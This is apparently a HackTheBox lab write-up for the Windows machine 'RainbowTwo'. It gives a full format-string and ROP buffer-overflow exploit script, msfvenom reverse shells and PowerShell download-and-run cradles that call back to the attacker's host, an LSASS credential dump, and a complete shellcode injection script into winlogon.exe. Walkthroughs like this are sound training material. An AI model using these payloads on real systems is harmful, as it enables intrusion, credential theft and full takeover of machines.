---
title: "RainbowTwo"
date: 2026-09-11 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, hard, binary-exploitation, buffer-overflow, rop, format-string, aslr-bypass, dep-bypass, process-injection, sedebugprivilege, lsass-dump, pypykatz, msfvenom, filesrv, anonymous-ftp]
image:
    path: /assets/Images/rainbowtwo-001_foothold_user-flag.png
    alt: RainbowTwo
description: "A bespoke file-transfer daemon on port 2121 leaks stack addresses through unfiltered format specifiers and overflows a stack buffer via the TEST command; a ROP chain into VirtualAlloc defeats DEP and lands a shell as rainbow2\\dev, and SeDebugPrivilege process injection into winlogon.exe elevates to SYSTEM."
---

## Overview

RainbowTwo is a hard-difficulty Windows machine. The attack begins with anonymous FTP serving the daemon binary and a copy of `kernel32.dll`, which are used offline to build a [format string](https://cwe.mitre.org/data/definitions/134.html) ASLR-bypass followed by a [stack buffer overflow](https://cwe.mitre.org/data/definitions/787.html) with a ROP-DEP bypass — all against FileSrv v0.2 on port 2121. The resulting shell runs as the `rainbow2\dev` service account, which holds `SeDebugPrivilege`. Enabling it and injecting 64-bit shellcode into `winlogon.exe` delivers a SYSTEM shell.

## Recon

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
2121/tcp open  unknown
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Anonymous FTP on port 21 exposes two files: `filesrv.exe` (the daemon) and `kernel32.dll` (the SysWOW64 32-bit version). Downloading both gives everything needed to build the exploit offline.

```bash
ftp 10.129.234.70
# anonymous / <blank>
binary
mget *
bye
```

`filesrv.exe` listens on port 2121 and speaks a custom plaintext protocol with three commands: `GET <path>` (returns file content base64-encoded), `LST /` (directory listing), and `TEST <data>` (the vulnerable path).

## Enumeration

Probing the `TEST` command with format specifiers reveals the daemon passes user input directly as a `printf` format string — an [externally-controlled format string](https://cwe.mitre.org/data/definitions/134.html) ([CWE-134](https://cwe.mitre.org/data/definitions/134.html)):

```bash
python3 -c "
import socket, time
s = socket.socket()
s.connect(('10.129.234.70', 2121))
s.sendall(b'TEST %p-%p-%p-%p-%p\r\n')
time.sleep(0.3)
print(s.recv(512))
"
```

The response echoes live stack pointer values in the `Path:` field:

```
b'Path: 0x1-0x77f18b10-0xffffce94-0x9013c-0x3711a\r\n'
```

The second pointer minus a fixed offset (`0x14120`) gives the loaded base of `kernel32.dll`, defeating ASLR. Because the binary was served via FTP, ROP gadget offsets can be computed offline:

```bash
ropper --file filesrv.exe --nocolor > gadgets.txt
ropper --file kernel32.dll --nocolor >> gadgets.txt
```

`checksec` on `filesrv.exe` confirms: **ASLR on, DEP on, no stack canary, no PIE**. The stack overflow offset is 1032 bytes to the saved return address.

## Foothold

The exploit sends two packets in sequence: a format-string probe to leak the DLL base, then a payload that places the ROP chain + shellcode before the stack pivot. The ROP chain calls `VirtualAlloc` to allocate an RWX page (defeating DEP via [CWE-787](https://cwe.mitre.org/data/definitions/787.html) [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html)) and then jumps into the shellcode.

**Important:** the daemon runs inside an NSSM job object that kills and restarts it after a single crash. Only **one exploit attempt** is safe — a second attempt hits the restarting service and leaves it in a broken state.

Generate the 32-bit shellcode (bad chars: `\x00\x09\x0a\x0b\x0c\x0d\x20\x25`):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.166 LPORT=4444 \
  -b '\x00\x09\x0a\x0b\x0c\x0d\x20\x25' -f raw -o sc_new.bin
```

Create `pwn6.py`:

```python
#!/usr/bin/python3
import socket, struct, sys, time
RHOST = "10.129.234.70"; RPORT = 2121; VO = 0xffffced0
def p32(x): return struct.pack("<I", x & 0xffffffff)
SC = open(sys.argv[1], "rb").read()
shellcode = b"\x90" * 16 + SC
N = int(sys.argv[2]) if len(sys.argv) > 2 else 1
for i in range(N):
  try:
    s = socket.socket(); s.settimeout(5); s.connect((RHOST, RPORT))
    s.sendall(b"TEST %p-%p-%p-%p-%p\r\n"); time.sleep(0.3)
    data = s.recv(300)
    b = int(data.split(b"Path: ")[1].split(b"-")[1], 16) - 0x14120
    rop  = p32(b+0x01010)*100
    rop += p32(b+0x3711a)+p32(0x8314c2ab)+p32(b+0x32ce4)
    rop += p32(b+0x01068)+p32(b+0x01068)
    rop += p32(b+0x48ca8)
    rop += p32(b+0x15638)
    rop += p32(b+0x3711a)+p32(0x8314d26b)+p32(b+0x32ce4)
    rop += p32(b+0x3039f)+p32(0x41414141)
    rop += p32(b+0x0dc14)+p32(0xffffffff)+p32(b+0x301e9)+p32(b+0x301e9)
    rop += p32(b+0x01068)+p32(b+0x14af9)
    rop += p32(b+0x15354)+p32(VO)
    rop += p32(b+0x3711a)+p32(b+0x9013c)
    rop += p32(b+0x05a66)+p32(0x41414141)
    rop += p32(b+0x113a8)
    rop += p32(b+0x0100f)+p32(b+0x0100f)
    rop += p32(b+0x15354)+p32(b+0x01010)
    rop += p32(b+0x113b1)
    rop += p32(b+0x11394)
    offset = 1032
    junk = b"A" * (offset - len(rop+shellcode))
    payload = rop + shellcode + junk + b"BBBB" + p32(b+0x11396)
    payload += b"D" * (4000 - len(payload))
    s.sendall(b"TEST " + payload + b"\r\n"); time.sleep(2); s.close()
    print("[*] attempt %d base=%#x rop=%d sc=%d" % (i+1, b, len(rop), len(shellcode)))
  except Exception as e: print("  err", e)
  time.sleep(1)
print("done")
```

Fire the exploit (N=1 mandatory):

```bash
nc -lvnp 4444 &
python3 pwn6.py sc_new.bin 1
```

Shell lands as `rainbow2\dev` running a 32-bit cmd.exe.

## User flag

```bash
type C:\Users\dev\Desktop\user.txt
```

```
HTB{...}
```

Shell is `rainbow2\dev` — a service account with limited privileges.

## Privilege Escalation

### Enumerating token privileges

```
C:\shared> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

`SeImpersonatePrivilege` is absent — potato exploits (GodPotato, JuicyPotato) fail with error 1314. However, `SeDebugPrivilege` **is** in the token (disabled by default). A disabled privilege can be re-enabled at runtime via `AdjustTokenPrivileges` with no additional permissions — this is by design in Windows.

### The 32-bit problem

The FileSrv shell is a 32-bit process. A 32-bit process cannot open a 64-bit LSASS handle, and `comsvcs.dll MiniDump` from 32-bit produces a zero-byte file. The solution is `C:\Windows\Sysnative\` — a virtual folder accessible only from 32-bit processes that redirects to the real 64-bit `System32`. Spawning a 64-bit PowerShell from there runs in the full 64-bit context.

### LSASS dump (dead end — workgroup box)

From the 32-bit shell, launch a 64-bit PowerShell via Sysnative:

```powershell
powershell -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('http://10.10.16.166:8081/lsass_wrap.ps1'))"
```

Where `lsass_wrap.ps1` is:

```powershell
"[*] Outer PS arch: $([IntPtr]::Size * 8)-bit"
$url = 'http://10.10.16.166:8081/inject.ps1'
$cmd = "IEX((New-Object Net.WebClient).DownloadString('$url'))"
& "C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ep bypass -c $cmd 2>&1
"[*] Done"
```

A P/Invoke `MiniDumpWriteDump` script in the 64-bit session dumps LSASS to `C:\Windows\Temp\lsass2.dmp` (46 MB). Parsing with pypykatz reveals only the `dev` NTLM hash — the Administrator has never interactively logged in on this workgroup machine, so no cached credential exists to reuse.

```bash
pypykatz lsa minidump /tmp/lsass2.dmp
```

### Process injection into winlogon.exe

`winlogon.exe` always runs as `NT AUTHORITY\SYSTEM`. With `SeDebugPrivilege` enabled, `OpenProcess` succeeds against any PID — including winlogon. The injection sequence is:

1. Enable `SeDebugPrivilege` via `AdjustTokenPrivileges`
2. `OpenProcess(PROCESS_ALL_ACCESS, winlogon_pid)` 
3. `VirtualAllocEx(RWX)` — allocate memory in the target process
4. `WriteProcessMemory` — copy shellcode in
5. `CreateRemoteThread` — start a new thread at the shellcode entry point

All from a 64-bit PowerShell session so the shellcode and API calls are 64-bit.

Generate 64-bit shellcode:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.166 LPORT=5555 \
  -e x64/xor -f raw -o sc64.bin
base64 -w0 sc64.bin > sc64.b64
python3 -m http.server 8081
```

Create `inject.ps1`:

```powershell
$code = @"
using System;
using System.Runtime.InteropServices;

public class Inject2 {
    [DllImport("kernel32")] public static extern IntPtr GetCurrentProcess();
    [DllImport("advapi32")] public static extern bool OpenProcessToken(IntPtr h, uint a, ref IntPtr t);
    [DllImport("advapi32")] public static extern bool LookupPrivilegeValue(string s, string n, ref long l);
    [DllImport("advapi32")] public static extern bool AdjustTokenPrivileges(IntPtr h, bool d, ref TP t, uint b, IntPtr p, IntPtr r);
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, uint allocType, uint protect);
    [DllImport("kernel32", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr, byte[] buf, uint size, out uint written);
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr sa, uint ss, IntPtr start, IntPtr param, uint flags, out uint tid);
    [DllImport("kernel32")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32")] public static extern uint GetLastError();
    [StructLayout(LayoutKind.Sequential, Pack=1)]
    public struct TP { public uint Count; public long Luid; public uint Attr; }
}
"@
Add-Type -TypeDefinition $code -Language CSharp

$tok = [IntPtr]::Zero
[Inject2]::OpenProcessToken([Inject2]::GetCurrentProcess(), 0x28, [ref]$tok) | Out-Null
$luid = [Int64]0
[Inject2]::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$luid) | Out-Null
$tp = New-Object Inject2+TP; $tp.Count = 1; $tp.Luid = $luid; $tp.Attr = 2
[Inject2]::AdjustTokenPrivileges($tok, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null

$sc = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://10.10.16.166:8081/sc64.b64'))

function Inject-Into($procName) {
    foreach ($proc in (Get-Process $procName -ErrorAction SilentlyContinue)) {
        $h = [Inject2]::OpenProcess(0x1fffff, $false, [uint32]$proc.Id)
        if ($h -ne [IntPtr]::Zero) {
            $mem = [Inject2]::VirtualAllocEx($h, [IntPtr]::Zero, [uint32]$sc.Length, 0x3000, 0x40)
            if ($mem -ne [IntPtr]::Zero) {
                $written = [uint32]0
                if ([Inject2]::WriteProcessMemory($h, $mem, $sc, [uint32]$sc.Length, [ref]$written)) {
                    $tid = [uint32]0
                    [Inject2]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [ref]$tid) | Out-Null
                    [Inject2]::CloseHandle($h) | Out-Null
                    return $true
                }
            }
            [Inject2]::CloseHandle($h) | Out-Null
        }
    }
    return $false
}

if (-not (Inject-Into "winlogon")) { Inject-Into "services" }
```

Catch the SYSTEM shell:

```bash
nc -lvnp 5555
```

Trigger via the 32-bit dev shell:

```
C:\shared> powershell -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('http://10.10.16.166:8081/lsass_wrap.ps1'))"
```

```
C:\WINDOWS\system32> whoami
nt authority\system
```

## Root flag

```bash
type C:\Users\Administrator\Desktop\root.txt
```

```
HTB{...}
```

Full compromise of `RainbowTwo` as `NT AUTHORITY\SYSTEM`.
